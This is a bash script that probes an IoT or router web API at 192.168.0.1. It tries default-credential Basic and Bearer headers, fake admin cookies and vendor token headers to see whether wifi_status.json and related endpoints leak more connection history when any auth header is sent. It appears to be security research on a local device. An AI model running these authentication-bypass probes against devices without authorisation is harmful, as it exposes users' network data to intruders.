#!/bin/bash
# Test different authentication headers to see if they reveal different data
# Discovered: wifi_status.json returns MORE data with ANY auth header

TARGET="192.168.0.1"
OUTPUT_DIR="recon/api/auth_tests"
mkdir -p "$OUTPUT_DIR"

echo "=== Testing Authentication Header Behavior ==="
echo "Target: $TARGET"
echo "Discovered: wifi_status.json returns 5 entries with auth vs 1 without"
echo

# Baseline - no auth
echo "[*] Baseline - No authentication header"
curl -s http://$TARGET/wifi_status.json | jq '.wifi_status.connect_history | length' > "$OUTPUT_DIR/baseline_count.txt"
echo "  Entries: $(cat $OUTPUT_DIR/baseline_count.txt)"
curl -s http://$TARGET/wifi_status.json > "$OUTPUT_DIR/no_auth.json"

# Test different auth schemes
declare -a auth_headers=(
    "Bearer test"
    "Bearer admin"
    "Bearer root"
    "Bearer password"
    "Bearer 12345"
    "Basic dGVzdDp0ZXN0"  # test:test base64
    "Basic YWRtaW46YWRtaW4="  # admin:admin base64
    "Basic cm9vdDpyb290"  # root:root base64
    "Token test"
    "API-Key test"
    "X-Auth-Token test"
)

echo
echo "[*] Testing various authentication headers..."
echo

for header in "${auth_headers[@]}"; do
    echo "Testing: Authorization: $header"

    # Save full response
    safe_name=$(echo "$header" | tr ' :/' '___')
    curl -s -H "Authorization: $header" http://$TARGET/wifi_status.json > "$OUTPUT_DIR/auth_${safe_name}.json"

    # Count entries
    count=$(jq '.wifi_status.connect_history | length' "$OUTPUT_DIR/auth_${safe_name}.json")
    echo "  Entries: $count"

    # Check if different from baseline
    baseline=$(cat "$OUTPUT_DIR/baseline_count.txt")
    if [ "$count" -gt "$baseline" ]; then
        echo "  ⚠️  REVEALS MORE DATA! ($count vs $baseline)"
    fi

    echo
done

# Try other endpoints with auth
echo "[*] Testing other endpoints with auth header..."
echo

declare -a endpoints=(
    "status.json"
    "wifi_scan_results.json"
    "wifi_profiles.json"
)

for endpoint in "${endpoints[@]}"; do
    echo "Testing $endpoint with Bearer token"
    curl -s http://$TARGET/$endpoint > "$OUTPUT_DIR/${endpoint%.json}_no_auth.json" 2>/dev/null
    curl -s -H "Authorization: Bearer test" http://$TARGET/$endpoint > "$OUTPUT_DIR/${endpoint%.json}_with_auth.json" 2>/dev/null

    # Compare sizes
    size_no_auth=$(wc -c < "$OUTPUT_DIR/${endpoint%.json}_no_auth.json")
    size_with_auth=$(wc -c < "$OUTPUT_DIR/${endpoint%.json}_with_auth.json")

    echo "  No auth: $size_no_auth bytes"
    echo "  With auth: $size_with_auth bytes"

    if [ "$size_with_auth" -gt "$size_no_auth" ]; then
        echo "  ⚠️  Auth header reveals more data!"
    elif [ "$size_with_auth" -lt "$size_no_auth" ]; then
        echo "  ℹ️  Auth header changes response"
    fi
    echo
done

# Try custom headers
echo "[*] Testing custom/vendor-specific headers..."
echo

declare -a custom_headers=(
    "X-Ayla-Token: test"
    "X-Device-Token: test"
    "X-Debug: 1"
    "X-Admin: true"
    "Cookie: session=test"
    "Cookie: admin=1"
)

for header in "${custom_headers[@]}"; do
    echo "Testing: $header"
    curl -s -H "$header" http://$TARGET/wifi_status.json > "$OUTPUT_DIR/custom_${header//[^a-zA-Z0-9]/_}.json"
    count=$(jq '.wifi_status.connect_history | length' "$OUTPUT_DIR/custom_${header//[^a-zA-Z0-9]/_}.json")
    echo "  Entries: $count"

    baseline=$(cat "$OUTPUT_DIR/baseline_count.txt")
    if [ "$count" -gt "$baseline" ]; then
        echo "  ⚠️  REVEALS MORE DATA!"
    fi
    echo
done

echo "=== Summary ==="
echo "Baseline entries: $(cat $OUTPUT_DIR/baseline_count.txt)"
echo "Max entries found: $(jq '.wifi_status.connect_history | length' $OUTPUT_DIR/auth_*.json | sort -n | tail -1)"
echo
echo "Check $OUTPUT_DIR/ for detailed results"
